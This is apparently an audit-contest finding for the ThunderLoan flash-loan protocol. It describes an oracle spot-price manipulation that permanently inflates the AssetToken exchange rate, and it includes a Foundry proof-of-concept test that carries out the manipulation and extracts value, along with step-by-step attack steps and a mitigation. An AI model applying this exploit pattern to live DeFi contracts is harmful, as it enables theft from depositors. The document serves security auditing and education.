## Thunder Loan
[https://codehawks.cyfrin.io/c/thunder-loan-clk83mi5b0004jp08axr82nq1/s/2]

100
EXP

Jan 26th, 2026 → Jan 27th, 2026

## Submission Details
Severity: **High**

## Oracle-Based Exchange Rate Manipulation in Flash Loans

firmanregar

## Root + Impact Description
ThunderLoan's `flashloan()` function calculates fees using spot prices from an oracle and immediately updates the AssetToken's exchange rate with this fee value. An attacker can manipulate the oracle price within the same transaction, causing the exchange rate to increase permanently. This allows the attacker to later redeem AssetTokens for more underlying tokens than they should receive.

The vulnerability stems from how flash loan fees affect the exchange rate:
1. Flash loan fees are calculated using the current oracle price
2. The exchange rate is immediately updated using this fee
3. The oracle price can be manipulated within the same transaction
4. The exchange rate increase is permanent and monotonic

```solidity
// ThunderLoan.sol - flashloan()
function flashloan(address receiverAddress, IERC20 token, uint256 amount, bytes calldata params) external {
    // ...
    uint256 fee = getCalculatedFee(token, amount);  // Uses current oracle price
    assetToken.updateExchangeRate(fee);              // Permanent increase
    // ...
}
​
function getCalculatedFee(IERC20 token, uint256 amount) public view returns (uint256 fee) {
    // Fee calculation depends on oracle price
    uint256 valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / s_feePrecision;
    fee = (valueOfBorrowedToken * s_flashLoanFee) / s_feePrecision;
}
```

```solidity
// AssetToken.sol
function updateExchangeRate(uint256 fee) external onlyThunderLoan {
    uint256 newExchangeRate = s_exchangeRate * (totalSupply() + fee) / totalSupply();
    
    if (newExchangeRate <= s_exchangeRate) {
        revert AssetToken__ExhangeRateCanOnlyIncrease(s_exchangeRate, newExchangeRate);
    }
    s_exchangeRate = newExchangeRate;  // Permanent change
}
```

## Risk
**Likelihood:**

When the oracle price is temporarily inflated:
* The calculated fee becomes artificially high
* The exchange rate increases based on this inflated fee
* After the price manipulation unwinds, the oracle returns to normal
* The exchange rate remains permanently elevated

This creates a mismatch between the exchange rate and the actual value backing it.

**Impact:**

* Attackers can withdraw more underlying tokens than they deposited
* The AssetToken contract becomes undercollateralized
* The exchange rate remains permanently corrupted
* Other users may be unable to fully redeem their positions

## Proof Of Concept
```
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;
​
import "forge-std/Test.sol";
import "../src/protocol/ThunderLoan.sol";
import "../src/protocol/AssetToken.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
​
// Simple AMM for testing oracle manipulation
contract SimpleAMM {
    ERC20 public token;
    ERC20 public weth;
​
    constructor(ERC20 _token, ERC20 _weth) {
        token = _token;
        weth = _weth;
    }
​
    function seed(uint256 t, uint256 w) external {
        token.transferFrom(msg.sender, address(this), t);
        weth.transferFrom(msg.sender, address(this), w);
    }
​
    function getPriceOfOnePoolTokenInWeth() external view returns (uint256) {
        uint256 t = token.balanceOf(address(this));
        uint256 w = weth.balanceOf(address(this));
        return (w * 1e18) / t;
    }
​
    function swapTokenForWeth(uint256 amountIn) external {
        uint256 t = token.balanceOf(address(this));
        uint256 w = weth.balanceOf(address(this));
        uint256 wethOut = (amountIn * w) / (t + amountIn);
​
        token.transferFrom(msg.sender, address(this), amountIn);
        weth.transfer(msg.sender, wethOut);
    }
}
​
contract TestToken is ERC20 {
    constructor(string memory n) ERC20(n, n) {}
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}
​
contract FlashLoanReceiver {
    ThunderLoan loan;
    IERC20 token;
​
    constructor(ThunderLoan l, IERC20 t) {
        loan = l;
        token = t;
    }
​
    function executeOperation(
        address,
        uint256 amount,
        uint256 fee,
        address,
        bytes calldata
    ) external returns (bool) {
        token.approve(address(loan), amount + fee);
        loan.repay(token, amount + fee);
        return true;
    }
}
​
contract ExchangeRateManipulationTest is Test {
    ThunderLoan loan;
    AssetToken asset;
    TestToken token;
    TestToken weth;
    SimpleAMM amm;
    FlashLoanReceiver receiver;
​
    address attacker = address(0xBEEF);
    address liquidityProvider = address(0xCAFE);
​
    function setUp() public {
        // Deploy tokens
        token = new TestToken("TOKEN");
        weth = new TestToken("WETH");
​
        // Setup AMM with low liquidity
        token.mint(liquidityProvider, 1_000 ether);
        weth.mint(liquidityProvider, 1_000 ether);
​
        amm = new SimpleAMM(token, weth);
​
        vm.startPrank(liquidityProvider);
        token.approve(address(amm), type(uint256).max);
        weth.approve(address(amm), type(uint256).max);
        amm.seed(100 ether, 100 ether);
        vm.stopPrank();
​
        // Deploy ThunderLoan
        loan = new ThunderLoan();
        loan.initialize(address(this));
​
        // Allow token
        vm.prank(loan.owner());
        asset = loan.setAllowedToken(token, true);
​
        // Setup attacker with AssetTokens
        receiver = new FlashLoanReceiver(loan, token);
        token.mint(attacker, 10 ether);
        
        vm.startPrank(attacker);
        token.approve(address(loan), type(uint256).max);
        loan.deposit(token, 1 ether);
        vm.stopPrank();
    }
​
    function testExchangeRateManipulation() public {
        uint256 exchangeRateBefore = asset.getExchangeRate();
        uint256 attackerBalanceBefore = token.balanceOf(attacker);
​
        vm.startPrank(attacker);
        
        // Manipulate oracle price
        token.approve(address(amm), type(uint256).max);
        amm.swapTokenForWeth(20 ether);
​
        // Execute flash loan with inflated price
        loan.flashloan(address(receiver), token, 5 ether, "");
        
        uint256 exchangeRateAfter = asset.getExchangeRate();
        
        // Redeem at inflated rate
        loan.redeem(token, type(uint256).max);
        
        vm.stopPrank();
​
        uint256 attackerBalanceAfter = token.balanceOf(attacker);
​
        // Verify the attack succeeded
        assertGt(exchangeRateAfter, exchangeRateBefore, "Exchange rate did not increase");
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker did not extract value");
        
        console.log("Exchange rate increase:", exchangeRateAfter - exchangeRateBefore);
        console.log("Value extracted:", attackerBalanceAfter - attackerBalanceBefore);
    }
}
```

An attacker can execute the following in a single transaction:

1. Setup: Hold a small amount of AssetTokens (from prior deposit)

2. Price Manipulation: Manipulate the TSwap pool to inflate the token's oracle price
* Use flash-borrowed capital to skew the AMM
* This increases the spot price returned by `getPriceOfOnePoolTokenInWeth()`

3. Flash Loan: Call `flashloan()` while the price is inflated
* The protocol calculates an artificially high fee
* The exchange rate increases permanently
* Repay the flash loan normally

4. Price Returns to Normal: The oracle price manipulation unwinds
* The oracle price returns to its original value
* The exchange rate remains elevated

5. Redemption: Redeem `AssetTokens` at the inflated rate
* Receive more underlying tokens than the economic value justifies

## Recommended Mitigation
The core issue is using spot prices to permanently update accounting state. Consider:
* Use TWAP instead of spot prices for fee calculations to resist manipulation
* Decouple fees from exchange rate updates - fees could be tracked separately without affecting redemption rates
* Add rate change bounds to limit how much the exchange rate can change in a single transaction
* Implement solvency checks before allowing redemptions

Example mitigation for the flash loan function:
```solidity
function flashloan(address receiverAddress, IERC20 token, uint256 amount, bytes calldata params) external {
    AssetToken assetToken = s_tokenToAssetToken[token];
    uint256 startingBalance = IERC20(token).balanceOf(address(assetToken));
​
    if (amount > startingBalance) {
        revert ThunderLoan__NotEnoughTokenBalance(startingBalance, amount);
    }
​
    if (!receiverAddress.isContract()) {
        revert ThunderLoan__CallerIsNotContract();
    }
​
    uint256 fee = getCalculatedFee(token, amount);
    
    // Remove automatic exchange rate update
    // assetToken.updateExchangeRate(fee);
    
    // Instead, track fees separately or use a different mechanism
​
    emit FlashLoan(receiverAddress, token, amount, fee, params);
​
    s_currentlyFlashLoaning[token] = true;
    assetToken.transferUnderlyingTo(receiverAddress, amount);
    
    receiverAddress.functionCall(
        abi.encodeWithSignature(
            "executeOperation(address,uint256,uint256,address,bytes)",
            address(token),
            amount,
            fee,
            msg.sender,
            params
        )
    );
​
    uint256 endingBalance = token.balanceOf(address(assetToken));
    if (endingBalance < startingBalance + fee) {
        revert ThunderLoan__NotPaidBack(startingBalance + fee, endingBalance);
    }
    s_currentlyFlashLoaning[token] = false;
}
```
